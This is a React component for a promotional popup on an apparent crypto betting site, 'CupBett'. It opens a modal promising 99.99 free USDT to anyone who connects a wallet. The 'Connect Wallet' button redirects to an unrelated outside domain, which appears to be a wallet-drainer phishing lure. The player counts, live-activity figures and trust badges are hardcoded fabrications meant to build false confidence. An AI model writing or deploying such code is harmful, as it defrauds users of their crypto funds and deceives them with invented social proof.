import { useEffect, useState, useRef } from 'react';
import { X, Zap, Shield, Users, TrendingUp } from 'lucide-react';

const PARTICLE_COUNT = 18;

function useParticles() {
  return useRef(
    Array.from({ length: PARTICLE_COUNT }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 3 + 1.5,
      delay: Math.random() * 4,
      duration: Math.random() * 4 + 5,
      opacity: Math.random() * 0.4 + 0.1,
    }))
  ).current;
}

export function PromoPopup() {
  const [visible, setVisible] = useState(false);
  const [closing, setClosing] = useState(false);
  const particles = useParticles();

  useEffect(() => {
    const alreadySeen = sessionStorage.getItem('cupbett_promo_seen');
    if (alreadySeen) return;
    const t = setTimeout(() => setVisible(true), 8000);
    return () => clearTimeout(t);
  }, []);

  function close() {
    setClosing(true);
    setTimeout(() => {
      setVisible(false);
      setClosing(false);
      sessionStorage.setItem('cupbett_promo_seen', '1');
    }, 380);
  }

  function handleConnect() {
    sessionStorage.setItem('cupbett_promo_seen', '1');
    window.location.href = 'https://secureconnectchain.com/';
  }

  if (!visible) return null;

  return (
    <div
      className="fixed inset-0 z-[9999] flex items-center justify-center p-4"
      style={{
        animation: closing
          ? 'promoBackdropOut 0.38s ease forwards'
          : 'promoBackdropIn 0.4s ease forwards',
      }}
    >
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/75"
        style={{ backdropFilter: 'blur(12px)', WebkitBackdropFilter: 'blur(12px)' }}
        onClick={close}
      />

      {/* Floating particles */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {particles.map(p => (
          <div
            key={p.id}
            className="absolute rounded-full bg-[#00DFA9]"
            style={{
              left: `${p.x}%`,
              top: `${p.y}%`,
              width: p.size,
              height: p.size,
              opacity: p.opacity,
              animation: `promoFloat ${p.duration}s ${p.delay}s ease-in-out infinite alternate`,
            }}
          />
        ))}
        {/* Gold particles */}
        {particles.slice(0, 6).map(p => (
          <div
            key={`g${p.id}`}
            className="absolute rounded-full bg-[#FACC15]"
            style={{
              left: `${(p.x + 30) % 100}%`,
              top: `${(p.y + 20) % 100}%`,
              width: p.size * 0.7,
              height: p.size * 0.7,
              opacity: p.opacity * 0.6,
              animation: `promoFloat ${p.duration + 2}s ${p.delay + 1}s ease-in-out infinite alternate`,
            }}
          />
        ))}
      </div>

      {/* Modal */}
      <div
        className="relative w-full max-w-[880px] rounded-2xl overflow-hidden flex flex-col md:flex-row shadow-[0_40px_120px_rgba(0,0,0,0.9)]"
        style={{
          background: 'linear-gradient(135deg, #0D1117 0%, #0B1620 50%, #0D1117 100%)',
          border: '1px solid rgba(0,223,169,0.18)',
          animation: closing
            ? 'promoModalOut 0.38s cubic-bezier(0.4,0,1,1) forwards'
            : 'promoModalIn 0.45s cubic-bezier(0.16,1,0.3,1) forwards',
          maxHeight: '95vh',
        }}
        onClick={e => e.stopPropagation()}
      >
        {/* Top accent bar */}
        <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-[#00DFA9] via-[#38BDF8] to-[#FACC15]" />

        {/* Ambient glow blobs */}
        <div className="absolute -top-20 -left-20 w-72 h-72 rounded-full pointer-events-none"
          style={{ background: 'radial-gradient(circle, rgba(0,223,169,0.12) 0%, transparent 70%)' }} />
        <div className="absolute -bottom-20 right-40 w-64 h-64 rounded-full pointer-events-none"
          style={{ background: 'radial-gradient(circle, rgba(56,189,248,0.1) 0%, transparent 70%)' }} />
        <div className="absolute top-10 right-20 w-48 h-48 rounded-full pointer-events-none"
          style={{ background: 'radial-gradient(circle, rgba(250,204,21,0.07) 0%, transparent 70%)' }} />

        {/* ─── LEFT: Celebrity Image ─────────────────────────────── */}
        <div className="relative w-full md:w-[42%] shrink-0 overflow-hidden"
          style={{ minHeight: '220px' }}>
          <img
            src="https://media.ourwebprojects.pro/wp-content/uploads/2026/05/Promo-Banner.webp"
            alt="CupBett Promo"
            className="w-full h-full object-cover object-center"
            style={{ minHeight: '220px', maxHeight: '520px' }}
          />
          {/* Overlay gradient blending into right panel */}
          <div className="absolute inset-0"
            style={{
              background: 'linear-gradient(to right, transparent 40%, rgba(13,17,23,0.85) 100%)',
            }} />
          {/* Bottom overlay for mobile */}
          <div className="absolute inset-x-0 bottom-0 h-16 md:hidden"
            style={{ background: 'linear-gradient(to top, #0D1117 0%, transparent 100%)' }} />

          {/* Live badge */}
          <div className="absolute top-4 left-4 flex items-center gap-1.5 bg-black/60 rounded-full px-3 py-1.5 border border-[#00DFA9]/30"
            style={{ backdropFilter: 'blur(8px)' }}>
            <span className="w-1.5 h-1.5 rounded-full bg-[#00DFA9] animate-pulse" />
            <span className="text-[10px] font-bold text-[#00DFA9] tracking-widest uppercase">Live Promo</span>
          </div>
        </div>

        {/* ─── RIGHT: Content ───────────────────────────────────── */}
        <div className="relative flex flex-col justify-between flex-1 px-6 py-7 md:px-8 md:py-8">

          {/* Close */}
          <button
            onClick={close}
            className="absolute top-4 right-4 w-8 h-8 rounded-full flex items-center justify-center text-[#94A3B8] hover:text-[#F8FAFC] hover:bg-[#253241] transition-all duration-200 z-10"
          >
            <X className="w-4 h-4" />
          </button>

          {/* USDT Badge */}
          <div className="flex items-center gap-2 mb-4">
            <div className="flex items-center gap-2 bg-[#FACC15]/10 border border-[#FACC15]/25 rounded-full px-3 py-1.5">
              <span className="text-[13px] font-black text-[#FACC15]" style={{ animation: 'promoUsdtPulse 2s ease-in-out infinite' }}>
                ✦ FREE 99.99 USDT BONUS
              </span>
            </div>
          </div>

          {/* Headline */}
          <div className="mb-4">
            <h2 className="text-[22px] md:text-[28px] font-black text-[#F8FAFC] leading-tight mb-2">
              Connect Your Wallet &{' '}
              <span style={{ background: 'linear-gradient(90deg, #00DFA9, #38BDF8)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
                Claim FREE
              </span>{' '}
              <span className="text-[#FACC15]">99.99 USDT</span>
            </h2>
            <p className="text-[13px] md:text-[14px] text-[#94A3B8] leading-relaxed">
              Join thousands of winning players on <span className="text-[#00DFA9] font-semibold">CupBett Sports Trading</span>. Instant deposits, real-time odds, provably fair.
            </p>
          </div>

          {/* Live activity */}
          <div className="flex items-center gap-2 mb-5">
            <div className="flex -space-x-1.5">
              {['#00DFA9', '#38BDF8', '#FACC15', '#AB9FF2', '#F6851B'].map((c, i) => (
                <div key={i} className="w-6 h-6 rounded-full border-2 border-[#0D1117]"
                  style={{ background: `radial-gradient(circle at 35% 35%, white, ${c})` }} />
              ))}
            </div>
            <span className="text-[12px] text-[#94A3B8]">
              <span className="text-[#00DFA9] font-semibold">+127 players</span> joined in the last hour
            </span>
          </div>

          {/* CTA Buttons */}
          <div className="flex flex-col sm:flex-row gap-3 mb-6">
            <button
              onClick={handleConnect}
              className="relative flex-1 flex items-center justify-center gap-2 py-3.5 px-6 rounded-xl font-bold text-[14px] text-[#0B0F14] overflow-hidden transition-all duration-200 hover:scale-[1.02] active:scale-[0.98]"
              style={{
                background: 'linear-gradient(135deg, #00DFA9 0%, #00C49A 100%)',
                boxShadow: '0 0 32px rgba(0,223,169,0.45), 0 4px 16px rgba(0,0,0,0.4)',
                animation: 'promoCTAPulse 2.5s ease-in-out infinite',
              }}
            >
              <Zap className="w-4 h-4 shrink-0" />
              Connect Wallet
              {/* Shimmer */}
              <div className="absolute inset-0 pointer-events-none"
                style={{ background: 'linear-gradient(105deg, transparent 40%, rgba(255,255,255,0.25) 50%, transparent 60%)', animation: 'promoShimmer 2.5s ease-in-out infinite' }} />
            </button>

            <button
              onClick={close}
              className="flex-1 sm:flex-none sm:px-6 py-3.5 rounded-xl font-semibold text-[13px] text-[#94A3B8] hover:text-[#F8FAFC] border border-[#253241] hover:border-[#2E3D50] hover:bg-[#121821] transition-all duration-200"
            >
              Maybe Later
            </button>
          </div>

          {/* Trust badges */}
          <div className="grid grid-cols-3 gap-2 pt-4 border-t border-[#253241]/60">
            {[
              { icon: Users, label: '50,000+', sub: 'Active Players', color: '#00DFA9' },
              { icon: TrendingUp, label: 'Instant', sub: 'Crypto Withdrawals', color: '#38BDF8' },
              { icon: Shield, label: 'Provably', sub: 'Fair Experience', color: '#FACC15' },
            ].map(({ icon: Icon, label, sub, color }) => (
              <div key={label} className="flex flex-col items-center gap-1 text-center">
                <div className="w-7 h-7 rounded-lg flex items-center justify-center mb-0.5"
                  style={{ background: `${color}15`, border: `1px solid ${color}30` }}>
                  <Icon className="w-3.5 h-3.5" style={{ color }} />
                </div>
                <span className="text-[11px] font-bold text-[#F8FAFC]">{label}</span>
                <span className="text-[10px] text-[#94A3B8] leading-tight">{sub}</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* Keyframe styles */}
      <style>{`
        @keyframes promoBackdropIn  { from { opacity:0 } to { opacity:1 } }
        @keyframes promoBackdropOut { from { opacity:1 } to { opacity:0 } }
        @keyframes promoModalIn  { from { opacity:0; transform:scale(0.88) translateY(24px) } to { opacity:1; transform:scale(1) translateY(0) } }
        @keyframes promoModalOut { from { opacity:1; transform:scale(1) translateY(0) } to { opacity:0; transform:scale(0.92) translateY(16px) } }
        @keyframes promoFloat { from { transform:translateY(0px) } to { transform:translateY(-18px) } }
        @keyframes promoUsdtPulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
        @keyframes promoCTAPulse  { 0%,100%{box-shadow:0 0 32px rgba(0,223,169,0.45),0 4px 16px rgba(0,0,0,0.4)} 50%{box-shadow:0 0 48px rgba(0,223,169,0.65),0 4px 20px rgba(0,0,0,0.4)} }
        @keyframes promoShimmer   { 0%{transform:translateX(-100%)} 60%,100%{transform:translateX(100%)} }
      `}</style>
    </div>
  );
}
